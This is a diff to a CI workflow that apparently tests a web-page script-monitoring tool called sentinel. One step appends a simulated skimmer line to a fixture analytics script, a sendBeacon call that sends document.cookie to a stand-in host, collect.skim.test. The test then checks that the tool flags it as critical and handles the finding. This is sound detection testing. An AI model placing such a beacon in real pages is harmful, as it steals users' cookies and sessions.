@@ -159,7 +159,41 @@ jobs:
           .venv/bin/sentinel audit list demo --json --limit 1 \
             | jq -e '.[0].action == "script.status_changed" and .[0].to_status == "pending"'
           .venv/bin/sentinel audit verify demo --json | jq -e '.ok and .events == 17'
-          git checkout -- examples/fixture-cdn
+          # That change is also a finding: low, raised one level for the payment page.
+          jq -e '.findings | length == 1 and .[0].kind == "script.changed"
+                 and .[0].severity == "medium" and .[0].reasons[0] == "the code changed"' "$scan"
+          # A skimmer: the tag starts beaconing to a host it never referenced. Critical on a
+          # payment page, and --fail-on high exits 5 (it wins over the unauthorized gate).
+          echo 'navigator.sendBeacon("https://collect.skim.test/c", document.cookie);' \
+            >> examples/fixture-cdn/analytics/v2/tag.js
+          set +e
+          .venv/bin/sentinel scan run demo --fail-on high --fail-on-unauthorized --json > "$scan"
+          test $? -eq 5
+          set -e
+          jq -e '.findings | length == 1 and .[0].severity == "critical"' "$scan"
+          finding=$(jq -r '.findings[0].id' "$scan")
+          .venv/bin/sentinel findings show "$finding" --json \
+            | jq -e '.detail.hosts_added == ["collect.skim.test"]
+                     and .detail.urls_added == ["https://collect.skim.test/c"]
+                     and (.detail.hunks[0].added | startswith("navigator . sendBeacon"))'
+          .venv/bin/sentinel scripts diff demo http://127.0.0.1:8001/analytics/v2/tag.js --json \
+            | jq -e '.hosts_added == ["collect.skim.test"] and .tokens.removed == 0'
+          # Handling it is audited; resolving needs a note.
+          .venv/bin/sentinel findings ack "$finding"
+          set +e
+          .venv/bin/sentinel findings resolve "$finding"
+          test $? -eq 2
+          set -e
+          .venv/bin/sentinel findings resolve "$finding" -n "Tag removed; vendor notified"
+          .venv/bin/sentinel findings list demo --status open --json | jq -e 'length == 1'
+          .venv/bin/sentinel audit verify demo --json | jq -e '.ok and .events == 19'
+          # An inline block inserted in front keeps the others' identities: one new script.
+          sed -i 's|<script nonce="demo-nonce">|<script>window.abTest = "B";</script><script nonce="demo-nonce">|' \
+            examples/fixture-site/checkout.html
+          .venv/bin/sentinel scan run demo --json > "$scan"
+          jq -e '[.findings[] | .kind] == ["script.added"]
+                 and (.findings[0].locator | endswith("/checkout.html#inline-3"))' "$scan"
+          git checkout -- examples
           # A page that fails makes `scan run` exit 3.
           .venv/bin/sentinel pages add demo http://127.0.0.1:8000/missing.html
           set +e
